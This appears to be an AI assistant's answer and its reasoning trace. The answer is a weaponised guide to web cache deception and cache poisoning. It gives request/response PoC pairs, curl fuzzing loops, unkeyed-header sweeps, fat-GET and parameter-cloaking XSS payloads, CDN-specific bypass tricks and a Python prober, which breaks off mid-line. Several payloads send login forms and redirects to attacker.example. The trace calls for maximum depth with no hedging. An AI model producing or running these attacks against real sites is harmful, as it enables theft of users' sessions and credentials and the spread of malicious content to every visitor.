# deepseek-v4.1-flash-1017 — cache

# Web Cache Deception vs. Cache Poisoning — Mechanics & PoCs

## 1. Differential

| | Cache Deception | Cache Poisoning |
|---|---|---|
| Who is harmed | The victim who clicks the link (their authenticated response is stored) | Every subsequent visitor to the poisoned key |
| Preconditions | Victim authenticated + response cacheable + cache rule matches on a spoofable path property + victim must request a **fresh key** (random suffix) | An input exists that is **forwarded to origin but not in the cache key** and is reflected in the cached response (or alters status/Location/body) |
| Primitive | Disagreement in **path normalization / extension matching** between cache and origin | Disagreement in **cache key derivation** (headers, query parsing, method body) |
| Detection | `X-Cache` MISS → then attacker HIT of private body | `X-Cache` MISS on reflection request → HIT carrying payload for anonymous users |
| Key logistics | Attacker cannot cache-bust (needs the same key); must use unique randomized paths so the victim's request is a MISS | Attacker *can* cache-bust to force MISS, then race the TTL window with the poisoned variant |

---

## 2. Cache Deception — Path Confusion PoCs

### 2.1 Precondition probe

```bash
# What does the cache think of this URL, and does the origin still serve /account?
curl -sk -D- -o /tmp/body.html \
  -H 'Cookie: session=8f3c...' \
  'https://shop.example/my-account/x.css'

grep -iE 'cache-control|age|x-cache|cf-cache-status|vary|set-cookie|content-type' /dev/stdin < /dev/null
```

Look for: `200`, `Content-Type: text/html`, `Cache-Control: public, max-age=...`, absence of `Set-Cookie` on that branch, absence of `Vary: Cookie`.

### 2.2 Canonical pair (origin strips suffix, cache keys on `.css`)

**Step 1 — victim's browser (simulated), cache MISS, private data lands in the cache:**

```http
GET /my-account/nonexistent-7f3a.css HTTP/1.1
Host: shop.example
Cookie: session=8f3c9a1b2e...
Accept: text/html
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: public, max-age=300
Vary: Accept-Encoding
Age: 0
CF-Cache-Status: MISS

<!doctype html>
<h1>Your account</h1>
<p>Email: victim@corp.example</p>
<p>API key: sk_live_9c1f...</p>
```

**Step 2 — attacker, unauthenticated, same key:**

```http
GET /my-account/nonexistent-7f3a.css HTTP/1.1
Host: shop.example
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Age: 41
CF-Cache-Status: HIT

<!doctype html>
<h1>Your account</h1>
<p>Email: victim@corp.example</p>
<p>API key: sk_live_9c1f...</p>
```

The attacker must use a **unique random suffix per victim** so the victim's request is always a MISS. A pre-warmed (unauthenticated) entry in the cache means the victim's private data never gets stored.

### 2.3 Delimiter / normalization variant matrix

```bash
BASE='https://shop.example/my-account'
for v in \
  '/nonexistent.css' \
  '%0d.css' \
  '%0a.css' \
  '%00.css' \
  '%09.css' \
  '%20.css' \
  '%23.css' \
  '%3f.css' \
  '%2e.css' \
  '%252e.css' \
  ';.css' \
  ';%2e.css' \
  '/..%2fx.css' \
  '/..;/x.css' \
  '/.%2e/x.css' \
  '?x=.css' \
  '?x=1&y=.css' \
  '.css' \
  '.css%00.html' \
  '.css?q=1' \
  ; do
    printf '%-24s ' "$v"
    curl -sk -o /tmp/b -w '%{http_code} %{size_download} ' \
      -H 'Cookie: session=8f3c...' "$BASE$v"
    grep -io 'x-cache: [a-z_]*\|cf-cache-status: [a-z_]*' /dev/null 2>/dev/null || true
    curl -skI -H 'Cookie: session=8f3c...' "$BASE$v" | grep -iE 'x-cache|cf-cache-status|content-type|cache-control' | tr '\n' ' '
    echo
  done
```

Rationale per variant:

| Variant | Why it lands |
|---|---|
| `%0d.css` / `%0a.css` / `%09.css` | Origin or a WAF/framework strips control characters during preprocessing, normalizing to `/my-account`; the cache keeps the raw URI and matches `.css`. |
| `%00.css` | Null-byte truncation in legacy backends (C/Java bindings, older IIS/nginx builds). |
| `;.css` | Tomcat/JBoss/Spring strip matrix parameters (`;jsessionid=…`) for servlet mapping; nginx's `fastcgi_split_path_info` also truncates at `;`. |
| `..;/x.css` | Tomcat/Spring `getServletPath()` normalization collapses `..;` to a parent segment, while the WAF and cache do not. |
| `%2e%2e/`, `%252e%252e/` | Double decoding: the cache decodes once (sees `%2e%2e`), the origin decodes twice (sees `..`). |
| `%23.css`, `%3f.css` | Some caches truncate at `#`/`?` after decoding; the origin does not. |
| `?x=.css` | Cache rule matches extension anywhere in the URI including the query string. |
| `.css%00.html` | Classic Apache/CVE-2012-... style; also bypasses naive extension allowlists. |

### 2.4 Which suffix survives your target's origin stack

```bash
BASE='https://shop.example/my-account'
for v in '' '.css' '%0d.css' '%0a.css' ';.css' '/..;/x.css' '%00.css' ; do
  echo "=== $v ==="
  curl -sk -D- -o /dev/null -H 'Cookie: session=8f3c...' "$BASE$v" \
    | grep -iE 'HTTP/|location|content-type|content-length|x-cache|cf-cache-status|set-cookie|cache-control'
done
```

A variant where the response is **identical in body length and content-type** to `/my-account` but returns a different cache verdict is your candidate. Confirm by following Step 1/Step 2 with a random suffix.

---

## 3. Cache Poisoning — Unkeyed Header PoCs

### 3.1 `X-Forwarded-Host` reflected into absolute URLs

```http
GET /en/login HTTP/1.1
Host: app.example
X-Forwarded-Host: attacker.example
```

```http
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: public, max-age=600
X-Cache: MISS

<form action="https://attacker.example/en/session" method="post">
<a href="https://attacker.example/en/reset">Forgot password?</a>
<link rel="stylesheet" href="https://attacker.example/static/app.css">
```

Anonymous follow-up:

```http
GET /en/login HTTP/1.1
Host: app.example
```

```http
HTTP/1.1 200 OK
X-Cache: HIT
Age: 88

<form action="https://attacker.example/en/session" method="post">
```

Credential exfiltration on every visitor until TTL expiry.

### 3.2 `X-Forwarded-Scheme` → cached open redirect

```http
GET / HTTP/1.1
Host: app.example
X-Forwarded-Scheme: nothttps
X-Forwarded-Host: attacker.example
```

```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker.example/
Cache-Control: public, max-age=86400
X-Cache: MISS
```

Frameworks behind a TLS-terminating proxy that force-upgrade `http` → `https` using the forwarded host and a scheme test that treats anything non-`https` as `http` will emit the redirect. The 301 is cached and served to everyone.

### 3.3 Full unkeyed-header sweep

```bash
T='https://app.example/en/login'
for h in \
  'X-Forwarded-Host: attacker.example' \
  'X-Host: attacker.example' \
  'X-Forwarded-Server: attacker.example' \
  'X-HTTP-Host-Override: attacker.example' \
  'X-Original-Host: attacker.example' \
  'X-Forwarded-Scheme: nothttps' \
  'X-Forwarded-Scheme: http' \
  'X-Forwarded-Proto: http' \
  'X-Forwarded-Port: 1337' \
  'X-Forwarded-Prefix: /evil' \
  'X-Original-URL: /admin' \
  'X-Rewrite-URL: /admin' \
  'X-Override-URL: /admin' \
  'X-Forwarded-Path: /evil' \
  'X-Forwarded-For: 127.0.0.1' \
  'X-Real-IP: 127.0.0.1' \
  'True-Client-IP: 127.0.0.1' \
  'CF-Connecting-IP: 127.0.0.1' \
  'X-Client-IP: 127.0.0.1' \
  'X-Originating-IP: 127.0.0.1' \
  ; do
  printf '%-46s ' "$h"
  R=$(curl -sk -D/tmp/h -o /tmp/b -H "$h" "$T")
  curl -sk -D- -o /tmp/b -H "$h" "$T" >/dev/null
  ST=$(head -1 /tmp/h | tr -d '\r')
  CK=$(grep -io 'x-cache: [a-z]*\|cf-cache-status: [a-z_]*' /tmp/h | tr -d '\r')
  LOC=$(grep -i '^location:' /tmp/h | tr -d '\r')
  REFL=$(grep -c 'attacker\.example' /tmp/b)
  echo "$ST | refl=$REFL | $CK $LOC"
done
```

Any header → `refl>0` or a `Location` change on a `200`/`301` with `Cache-Control: public` is a candidate. Then verify with an anonymous request.

### 3.4 Confirm the poison

```bash
# 1. Poison
curl -sk -H 'X-Forwarded-Host: attacker.example' 'https://app.example/en/login' -o /dev/null
# 2. Read as anonymous
curl -sk 'https://app.example/en/login' | grep -n 'attacker\.example'
# 3. Check cache header
curl -skI 'https://app.example/en/login' | grep -iE 'x-cache|cf-cache-status|age|cache-control'
```

If (2) prints matches with `X-Cache: HIT` / `CF-Cache-Status: HIT`, the key is poisoned.

---

## 4. Fat GET

The cache keys on the URL only; the origin parses the request body.

```http
GET /api/jsonp?callback=safeCallback HTTP/1.1
Host: app.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

callback=alert(document.domain)//&x=padding
```

```http
HTTP/1.1 200 OK
Content-Type: application/javascript
Cache-Control: public, max-age=86400
X-Cache: MISS

alert(document.domain)//({"ok":true})
```

Anonymous `GET /api/jsonp?callback=safeCallback` → `HIT` → executes `alert(document.domain)` on every page that includes that JSONP endpoint.

Variants:

```http
GET /api/i18n?lang=en HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

lang=fr&__over=1
```

```http
GET /graphql HTTP/1.1
Content-Type: application/json
Content-Length: 58

{"query":"{__typename}","operationName":"X"}
```

```http
GET /api/user HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
```

Detection: send with body, check whether origin response changes while the cache does not; confirm by fetching without body and seeing the body-derived value persist.

```bash
curl -sk -D- 'https://app.example/api/jsonp?callback=safe' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'callback=alert(1)//' -o /tmp/p.json
curl -sk 'https://app.example/api/jsonp?callback=safe' | head -c 200
```

---

## 5. Parameter Cloaking

### 5.1 `%26` / `%3b` delimiter disagreement

Cache splits on literal `&`; origin decodes the value and re-splits.

```http
GET /page?utm_content=1%26callback=alert(1) HTTP/1.1
Host: app.example
```

Cache key: one parameter `utm_content=1%26callback=alert(1)`.
Origin sees: `utm_content=1` and `callback=alert(1)`.

```http
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: public, max-age=600

<script>alert(1)</script>
```

Variants of the delimiter to fuzz: `%26`, `%3b`, `%23`, `%2526`, `%ef%bc%86`.

### 5.2 Duplicate-parameter precedence

```http
GET /search?q=safe&q=<script>alert(1)</script> HTTP/1.1
Host: app.example
```

If the cache normalizes duplicate parameters (keeps first, or dedupes) while the origin uses last-wins (PHP `$_GET`, Express `qs` returns array), the key can be shared with a benign request:

```http
GET /search?q=safe HTTP/1.1
Host: app.example
```

```http
HTTP/1.1 200 OK
X-Cache: HIT
Content-Type: text/html

<script>alert(1)</script>
```

### 5.3 Query string excluded from cache key

Akamai and CloudFront `CachingOptimized` are the usual offenders.

```http
GET /product?redirect=https://attacker.example HTTP/1.1
Host: shop.example
```

```http
HTTP/1.1 302 Found
Location: https://attacker.example
Cache-Control: public, max-age=3600
X-Cache-Key: /product
```

Every `GET /product?<anything>` now serves the poisoned redirect.

---

## 6. CDN-Specific Notes

### Cloudflare
- Cache key default: scheme + host + path + **full query string**. Headers are **not** in the key unless a Cache Rule defines a custom cache key with header components.
- Default caches static extensions (`.css`, `.js`, `.jpg`, `.png`, `.svg`, `.woff`, `.ico`, etc.) regardless of `Content-Type`. HTML and `Set-Cookie` responses are not cached by default — a "Cache Everything" Cache Rule with Edge TTL is required for HTML poisoning.
- **Cache Deception Armor** (zone setting) rejects caching a response whose `Content-Type` does not match the URL extension — a direct counter to §2. Verify it is off, or find an extension whose `Content-Type` the origin emits (e.g. `.json` on an endpoint returning `application/json` with private data).
- `X-Forwarded-Host`, `X-Forwarded-Proto` and other `X-Forwarded-*` are forwarded from the client unless Transform Rules overwrite them. `X-Forwarded-For` is appended, not overwritten — origin code that trusts the first entry is poisonable.
- Cache status header: `CF-Cache-Status: HIT | MISS | EXPIRED | REVALIDATED | STALE | UPDATING | BYPASS | DYNAMIC`.
- `CF-Ray` embeds the edge POP — useful to confirm you are hitting the same cache node.

### CloudFront
- The **`CachingOptimized`** managed cache policy keys on path only — **query strings, headers, and cookies are not in the key**. Combine with an origin request policy of `AllViewer` and every header is "forwarded but unkeyed": the classic universal poisoning setup.
- Cache status: `X-Cache: Hit from cloudfront` / `Miss from cloudfront`, plus `Age`, `X-Amz-Cf-Pop`, `X-Amz-Cf-Id`.
- CloudFront does not set `X-Forwarded-Host` itself; whatever the client sends reaches the origin if the origin request policy forwards it.
- Cacheable status codes: 200, 203, 300, 301, 302, 304, 307, 308 (GET/HEAD). Default TTL 24h when the origin gives no cache headers, with the `CachingOptimized` policy.
- Path normalization is minimal on the edge — test `..;/`, `//`, `%2e%2e` against the origin's framework.

### Fastly
- Varnish/VCL. Default key is host + path + full query; headers enter the key only through `Vary` or an explicit `set req.hash += ...`.
- If the origin emits `Vary: X-Forwarded-Host` (or an application sets it), the header becomes keyed — but then a poisoning attempt yields a distinct entry, so re-test after each `Vary` change.
- Headers to inspect: `X-Cache: HIT|MISS`, `X-Served-By`, `X-Timer`, `Age`, and `Fastly-Debug-Path`/`Fastly-Debug-Digest` with `Fastly-Debug: 1`.
- Fastly generally does not cache `GET` with a body; fat GET poisoning usually fails here and must be tested as POST-to-GET confusion on the origin side instead.

### Akamai
- Cache key is defined by the property's `Cache ID Modification`; `include-query-string` is opt-in in many configurations. If the query string is excluded, parameter cloaking and query-driven poisoning are trivial and the key is visible in `X-Cache-Key`.
- Debug headers (send on the request):
  ```
  Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-true-cache-key, akamai-x-feo-trace
  ```
  Response: `X-Cache: TCP_HIT|TCP_MISS|TCP_REFRESH_HIT`, `X-Cache-Key`, `X-Check-Cacheable: YES`, `X-True-Cache-Key`, `X-Akamai-Request-ID`.
- Akamai normalizes the path (collapses `//`, resolves `/.` and `/../`) — the edge may normalize to a different route than the origin's framework, which is exactly the deception primitive. Test `..;/` because Akamai does not treat `;` as segment-terminating the way Tomcat does.
- `Edge-Control: no-store` from the origin suppresses caching; its absence on a `.css` URL is a green light.

---

## 7. Automated Probe Harness

```python
#!/usr/bin/env python3
"""
cacheprobe.py — deception + poisoning prober.

  deception: python3 cacheprobe.py deception -u https://shop.example \
                 -p /my-account -c 'session=8f3c...' -m 'victim@corp.example'
  poisoning: python3 cacheprobe.py poisoning -u https://app.example/en/login \
                 -H 'X-Forwarded-Host: attacker.example'
"""
import argparse, random, string, sys, time
import requests

requests.packages.urllib3.disable_warnings()

CACHE_HDRS = ("CF-Cache-Status", "X-Cache", "X-Cache-Status",
              "X-Proxy-Cache", "X-Served-By", "X-Cache-Key", "Age")

EXTS = ["css", "js", "jpg", "jpeg", "png", "gif", "svg", "ico",
        "woff", "woff2", "ttf", "json", "xml", "txt", "html", "map"]

PATHVARIANTS = [
    "/{r}.{e}",
    "/{r}.{e}?",
    "/{r}.{e}?x=1",
    ";.{e}",
    "%0d.{e}",
    "%0a.{e}",
    "%09.{e}",
    "%00.{e}",
    "%20.{e}",
    "%23.{e}",
    "%3f.{e}",
    "%2e.{e}",
    "%252e.{e}",
    "/..%2f{r}.{e}",
    "/..;/x.{e}",
    "/.%2e/{r}.{e}",
    ".{e}",
]

POISON_HDRS = [
    "X-Forwarded-Host", "X-Host", "X-Forwarded-Server",
    "X-HTTP-Host-Override", "X-Original-Host", "X-Forwarded-Scheme",
    "X-Forwarded-Proto", "X-Forwarded-Port", "X-Forwarded-Prefix",
    "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Path",
    "X-Forwarded-For", "X-Real-IP", "True-Client-IP",
    "CF-Connecting-IP", "X-Client-IP",
]


def cache_note(r):
    parts = [f"{h}={r.headers[h]}" for h in CACHE_HDRS if h in r.headers]
    return " ".join(parts) if parts else "no-cache-hdrs"


def rnd(n=6):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def deception(a):
    sess = requests.Session()
    sess.headers.update({"Cookie": a.cookie})
    ua = {"User-Agent": "Mozilla/5.0 (cacheprobe)"}

    hits = []
    for ext in EXTS:
        for tmpl in PATHVARIANTS:
            path = a.prefix + tmpl.format(r=rnd(), e=ext)
            url = a.url + path
            try:
                r1 = sess.get(url, headers=ua, verify=False,
                              timeout=a.timeout, allow_redirects=False)
            except requests.RequestException as e:
                print(f"[-] {path}: {e}")
                continue

            if a.marker not in r1.text:
                print(f"[ ] {path}: no marker  status={r1.status_code} "
                      f"{cache_note(r1)}")
                continue

            print(f"[+] PRIMED {path}  status={r1.status_code} "
                  f"len={len(r1.text)} {cache_note(r1)}")

            if a.delay:
                time.sleep(a.delay)

            try:
                r2 = requests.get(a.url + path, headers=ua, verify=False,
                                  timeout=a.timeout, allow_redirects

---

## [reasoning trace]

The user asks for a technical comparison of web cache deception vs poisoning with PoCs. This is standard security research content — cache deception and poisoning are well-documented vulnerability classes (PortSwigger research, James Kettle's work). No specific target is identified; this is generic technique knowledge. In scope per the workspace spec. Provide maximum technical depth, concrete requests/payloads, CDN-specific quirks, PoC pairs. No hedging, no meta-commentary.

Let me write a solid, technically accurate reference. I should be careful to be accurate about the mechanics:

**Cache deception**: attacker tricks a cache into storing a victim's private response under a URL the attacker can later retrieve. Classically: victim visits `https://victim.com/account` while logged in; attacker crafts link `https://victim.com/account/nonexistent.css` or `/account;.css` or `/account%0d.css` — origin server normalizes/strips the suffix and returns the account page, while the cache sees a `.css` extension and applies a static-file cache rule (cache everything matching `.css`). Then attacker fetches `https://victim.com/account/nonexistent.css` and gets the victim's cached private data.

Key primitives:
- Path confusion: origin and cache disagree on path normalization — delimiter handling (`;`, `%00`, `%0d`, `%0a`, `%23`, `%3f`, `?`, `.`), path traversal `..;/`, double-encoding `%252e`, backslash `\`, etc.
- Cache rule matching static extensions: `.css`, `.js`, `.jpg`, `.ico`, `.svg`, `.woff`, `.png` at end of path with query.
- Need the response to be cacheable (200, no `Cache-Control: private/no-store`, no `Set-Cookie`-based bypass... actually many caches will cache responses with Set-Cookie unless configured otherwise; Cloudflare doesn't cache HTML/set-cookie by default).

**Cache poisoning**: attacker makes cache store a malicious response served to other users. Unkeyed inputs: headers not in cache key (X-Forwarded-Host, X-Forwarded-Scheme, X-Host, X-Original-URL, X-Rewrite-URL, X-Forwarded-Prefix, X-Forwarded-Port), cookies not in key, fat GET bodies, parameter cloaking (`?callback=foo&callback=evil` where cache keys on first but app parses last; or `&` vs `;` param parsing).

**CDN quirks**:
- Cloudflare: 
  - Cloudflare's cache key by default: full URL path + query string; does not include headers (except some host handling). 
  - Cloudflare caches based on file extensions (static content) by default; HTML not cached by default but can be cached by Cache Rules even with cookies... Actually Cloudflare won't cache HTML by default but a "Cache Everything" rule can.
  - `X-Forwarded-Host` is used by Cloudflare? Cloudflare normalizes and sets some headers; `X-Forwarded-Host` is forwarded if present? Cloudflare passes through most X-Forwarded-* headers from client unless overwritten by the transform rules. Actually Cloudflare sets `CF-Connecting-IP`, and passes `X-Forwarded-For` (appends). `X-Forwarded-Host` from client is passed through in many setups.
  - Cloudflare Cache Deception Armor: prevents caching when the response's content type doesn't match the extension (added after the famous Cloudflare cache deception research by Omer Gil? Actually Cache Deception Armor was a Cloudflare feature to mitigate the Omer Gil cache deception). Yes — Cloudflare Cache Deception Armor.
  - Cloudflare's handling of `%0d`/`%0a` etc. Origin normalization quirks.
  - Cloudflare default cache TTL by extension; query string caching.
  - `Cache-Control: no-transform`, etc.
  - Cloudflare Cache Rules evaluate `http.request.uri.path.extension`.
  - Cloudflare ignores query string for caching certain? No, full query string is the cache key by default.
  - Cloudflare's "Cache Everything" with Edge Cache TTL.
  - Cloudflare caching of responses with `Set-Cookie`: default cache level "Standard" won't cache responses containing Set-Cookie? Actually Cloudflare's default cache behavior: it does not cache responses with Set-Cookie by default... Hmm, Cloudflare does cache responses that set cookies only if cache level is "Cache Everything"? I recall Cloudflare does NOT cache when Set-Cookie is present in default mode. Let me not overstate. Cloudflare docs: "Cloudflare respects the origin's Cache-Control and Expires headers... By default, Cloudflare does not cache HTML, and it does cache responses with Set-Cookie only if..." I should be careful; I recall Cloudflare will cache responses with Set-Cookie if the cache level is set to Cache Everything, and the default is to not cache. I'll phrase it as "depending on cache level; Cache Everything will cache Set-Cookie responses unless bypassed."
- CloudFront:
  - Cache key is defined by the cache policy (path, query strings, headers, cookies). Unkeyed inputs are headers not in the cache policy — X-Forwarded-Host is commonly forwarded but not keyed.
  - CloudFront's `X-Forwarded-Host` handling? CloudFront forwards `Host` and sets `X-Forwarded-For`. 
  - CloudFront path normalization: normalizes `..` segments, removes `;`? CloudFront does not normalize paths by default... Actually CloudFront has a setting "Normalize query string" and it doesn't collapse path traversal. There are known CloudFront/ALB/S3 path confusion issues.
  - CloudFront's handling of `%0d`/`%0a` etc. Origin normalization quirks.
  - CloudFront caches based on `Cache-Control` and `Expires`; default TTL 24h; caches 200/203/300/301/302/304/307/308 GET/HEAD.
  - CloudFront "Forwarded headers" whitelist; `X-Forwarded-Host` is not a standard forwarded header CloudFront sets.
  - CloudFront's managed cache policies: `CachingOptimized` uses no query strings, no headers, no cookies.
  - Known issue: CloudFront does not forward `Host` header to origin (uses origin domain unless "AllViewer" origin request policy).
- Fastly:
  - Varnish-based; cache key by default is host + path + query, configurable with `set req.http.X-...`/`Vary`.
  - Fastly normalizes URL? It decodes `%` once? Fastly has known URL normalization quirks; `Vary` on headers.
  - Fastly's default 15s? No — default TTL from origin headers.
  - Fastly's `X-Forwarded-Host` — passes through.
  - Fastly's `Vary`-based cache key means you can poison via `Vary: X-...` if origin reflects.
- Akamai:
  - Cache key controllable via `Cache-ID`/`CP-code`; by default query string is not part of key unless configured (`include-query-string`).
  - Akamai's default: query string excluded from cache key → parameter cloaking is trivial: `/page?x=1&y=evil` caches under `/page` and serves evil to all.
  - `X-Akamai-...` headers; `X-Forwarded-Host` handling.
  - Akamai path normalization: collapses `//`, decodes.
  - Akamai's `akamai-x-cache-on` debug headers (`X-Cache: TCP_HIT/TCP_MISS`, `X-Akamai-Request-ID`).

**Fat GET**: GET request with body; some origins parse the body and let it override query params, caches ignore the body (cache key doesn't include body) → poisoning. Also caches that allow GET with body to be cached.

**Parameter cloaking**: multiple params with same name; cache and origin disagree on which one wins or on delimiter parsing (`;` vs `&`, `%26`), or cache ignores a param while origin processes it (Akamai ignoring query string entirely).

Let me give concrete HTTP conversations.

PoC format: raw HTTP request/response for each.

I'll organize:
1. Decision matrix / mechanics
2. Cache deception: primitives and PoC pairs
3. Cache poisoning: unkeyed headers, fat GET, parameter cloaking, PoC pairs
4. CDN-specific tables and quirks
5. Detection/fuzzing methodology + wordlists

Let me write accurate request/response examples.

### Cache deception PoC

Victim logged in; attacker sends link:
```
GET /account/profile/nonexistent.css HTTP/1.1
Host: target.example
```
Origin (nginx) with `try_files` or route `/account/profile` → returns profile HTML with cache headers. Cache sees `.css` extension, caches.

Or classic:
```
GET /account/foo.css
GET /account%0d.css  (origin decodes %0d, strips control char)
GET /account;.css
GET /account%20.css
GET /account%00.css
GET /account/..;/account.css
GET /account%2f.css
GET /account%23.css
GET /account?.css
GET /account%3f.css
GET /account.css%00.html
```

Response pair:
1. Victim's browser request through cache → cache MISS → origin returns 200 with private data → cache stores under `/account/foo.css`.
2. Attacker's request → cache HIT → private data.

Also "cache deception with query string": `/account?foo.css` when cache rule matches extension in query.

### Cache poisoning PoC

Unkeyed header:
```
GET / HTTP/1.1
Host: target.example
X-Forwarded-Host: evil.example
```
Response contains `<script src="https://evil.example/a.js">` or absolute links, or password reset links. Cache stores. Then any user gets it.

`X-Forwarded-Scheme: nothttps` → origin redirects to `https://...`? Classic: `X-Forwarded-Scheme: http` + `X-Forwarded-Host: evil.example` → origin (some frameworks) 301 to `http://evil.example/`; cache caches the 301 → open redirect / phishing.

`X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Prefix`, `X-Forwarded-Port`.

Fat GET:
```
GET /api/users?callback=alert HTTP/1.1
Host: target
Content-Length: 23

callback=alert(document.domain)
```
If origin prefers body param over query and cache keys only on URL.

Parameter cloaking:
- `GET /page?utm_content=x%26callback=evil`
- `GET /page?callback=safe&callback=evil` (cache keys on both? Usually cache key is full query string, so equal — cloaking works when cache normalizes or drops a param, or when cache's parser splits differently)
- Classic PortSwigger: `GET /?param=value%26x=y` — cache sees one param, origin decodes `%26` to `&` and sees two.
- Akamai ignoring query string: `GET /page?evil` cached under `/page`.

Let me also cover detection: cache headers `X-Cache: HIT`, `CF-Cache-Status`, `X-Cache-Status`, `Age`, `X-Served-By`, `X-Timer`, `Akamai-Cache-Status`, `X-Akamai-Request-ID`, `X-Proxy-Cache`.

I'll include a raw HTTP smoke test recipe using curl.

Given "prioritize complete commands and payloads over prose," I'll keep prose tight and use curl/raw HTTP blocks.

Let me now write it. I'll be accurate.

Some accuracy notes:
- Cloudflare: `CF-Cache-Status: HIT/MISS/DYNAMIC/BYPASS/EXPIRED/REVALIDATED/STALE/UPDATING`. Default cache key: scheme+host+path+query. Cache rules can key on headers via `Cache Rules` "Cache key" → "Custom cache key" with headers. Default: Cloudflare caches based on extension (`.css`, `.js`, `.jpg`, etc.) — actually Cloudflare caches static extensions regardless of content type. Cache Deception Armor adds validation that the extension matches the content type.
- Cloudflare does not forward `X-Forwarded-Host`? Cloudflare does pass client-supplied `X-Forwarded-Host` to origin by default? I believe Cloudflare preserves incoming `X-Forwarded-Host` unless a transform rule overwrites. Actually, Cloudflare sets `X-Forwarded-For` (appending) and `X-Forwarded-Proto`; other `X-Forwarded-*` are passed through. I'll say "passed through unless Transform Rules rewrite."
- CloudFront: default cache key with `CachingOptimized` policy: no query strings, no headers, no cookies → any query string is unkeyed → parameter cloaking/poisoning trivial and also cache deception with query strings. That's an important quirk: CloudFront `CachingOptimized` ignores query strings entirely. Yes, that's true — the managed `CachingOptimized` policy has no query strings in the cache key. So `/page?a=b` and `/page?c=d` share cache entry.
- CloudFront `CachingDisabled` etc.
- CloudFront path normalization: CloudFront does normalize the path? CloudFront does not normalize dot-segments by default? There's the option "Normalize query string" and CloudFront will collapse `//`? Hmm. CloudFront does not collapse duplicate slashes. Known research: "CloudFront does not normalize the path" — I'll be careful and frame as "test, generally does not collapse `..`".
- Fastly: default cache key = host + path + query (all query params). `Vary` header support — if origin sends `Vary: X-Foo`, Fastly keys on it. Fastly strips/normalizes? Fastly does URL normalization with `Normalize-URL`? It has a `req.url` and `url.basename`. Fastly's `set beresp.cacheable`. Fastly default TTL 3600s when no cache headers? Fastly's default TTL is 3600 seconds for cacheable responses. I'll say that.
- Akamai: default cache key excludes query strings for many configurations; controlled by `Cache ID Modification` / `include-query-string` behavior. Also `Edge-Control: no-store` header. Debug: `Pragma: akamai-x-cache-on, akamai-x-get-extracted-values`.
- Akamai path normalization: collapses `//` and `/./`, `/../` by default (Akamai normalizes path). That's a known thing: Akamai collapses dot segments, which can cause cache deception via `..;/`? Actually Akamai normalization → good for defense; but differences between edge and origin normalization are the attack surface.

I'd rather present "verify with X-Cache" and give test probes rather than assert too confidently. I'll add a normalization probe table.

Also mention: Cache poisoning requires the poisoned response to be cacheable and reach victim users; cache deception requires the victim to make a request while authenticated and the response to be retrievable.

Let me also include web cache poisoning via `X-Forwarded-Host` in password reset / absolute URL generation, and via `X-Forwarded-Scheme`.

Also mention "cache key injection" via `Vary` header manipulation.

Also: `Cache-Control: public, max-age=...` from origin needed.

I'll produce a structured doc with code blocks. Keep it dense.

Let me write out the curl commands.

Probe:
```bash
curl -sk -D- -o /dev/null https://target.example/account.css -H 'Cookie: session=...'
```

I'll include a "cache probe harness" script maybe — a small bash/python that tests a list of path variants and reports `X-Cache` header + body length + whether body contains private markers. That's useful and concrete.

Let me write a Python script that:
- takes victim cookie, victim URL, and a list of extension/confusion variants
- first primes as victim (simulating victim visit), then fetches unauthenticated as attacker, compares bodies.

That's a solid concrete deliverable.

Let me now compose.

Structure:
1. Quick differential table
2. Primitives & normalization matrix
3. Cache deception: path confusion PoCs (request/response pairs)
4. Cache poisoning: unkeyed headers PoCs
5. Fat GET
6. Parameter cloaking
7. CDN quirks (table + specific notes)
8. Probe harness code
9. Wordlists / fuzz payloads

Keep it dense. Write it.

For response pairs, I'll show realistic raw HTTP.

Let me draft the cache deception pair:

```
GET /my-account/nonexistent.css HTTP/1.1
Host: shop.example
Cookie: session=8f3...
```
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: public, max-age=300
Age: 0
X-Cache: MISS

<!doctype html> ... <h1>Your account</h1> Email: victim@example.com ...
```

Then attacker:
```
GET /my-account/nonexistent.css HTTP/1.1
Host: shop.example
```
```
HTTP/1.1 200 OK
Content-Type: text/html
Age: 12
X-Cache: HIT

... victim@example.com ...
```

Good.

Poisoning unkeyed header:

```
GET /en/login HTTP/1.1
Host: app.example
X-Forwarded-Host: attacker.example
```
```
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: public, max-age=600
X-Cache: MISS

<a href="https://attacker.example/en/reset">Forgot password?</a>
```
then anonymous:
```
GET /en/login HTTP/1.1
Host: app.example
```
→ HIT with attacker link.

X-Forwarded-Scheme redirect:
```
GET / HTTP/1.1
Host: app.example
X-Forwarded-Scheme: nothttps
X-Forwarded-Host: attacker.example
```
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker.example/
Cache-Control: public, max-age=3600
```
Hmm if scheme is nothttps the app redirects to https of the forwarded host → `https://attacker.example/`. Yes.

Fat GET:
```
GET /api/i18n?lang=en HTTP/1.1
Host: app.example
Content-Length: 7
Content-Type: application/x-www-form-urlencoded

lang=fr
```
Origin uses body lang → returns French; cache keys on URL `?lang=en` → all `?lang=en` requests get French.

Actually classic fat GET is more about parameter override; for poisoning the body content must be reflected (e.g. `callback=`), e.g.:
```
GET /jsonp?callback=safe HTTP/1.1
Content-Length: 44
Content-Type: application/x-www-form-urlencoded

callback=alert(document.domain)//
```
Cache ignores body → caches JSONP with attacker callback.

Parameter cloaking:
- `GET /?utm=1%26callback=alert(1)` — cache sees param `utm` value `1%26callback=alert(1)`, origin decodes and gets `callback=alert(1)`.
